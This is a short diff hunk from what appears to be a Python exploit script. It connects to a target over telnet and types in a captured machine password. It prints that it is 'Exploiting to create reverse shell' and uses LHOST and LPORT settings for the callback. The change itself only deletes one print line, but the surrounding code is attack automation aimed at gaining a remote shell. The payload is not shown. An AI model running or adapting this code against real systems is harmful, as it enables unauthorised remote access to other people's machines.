@@ -59,7 +59,6 @@ print(f"{YELLOW} The machines password is {RED} {Password}{RESET}")
 if (Target != None and RPORT != None and LHOST != None and LPORT != None and Password != None):
     tn = telnetlib.Telnet(Target)
     print(MAGENTA+"Exploiting to create reverse shell"+RESET)
-    print(YELLOW+"Please enter password "+Password+""+RESET)
     tn.write(b"\n")
     time.sleep(1)
     tn.write(Password.encode('ascii') + b"\n")
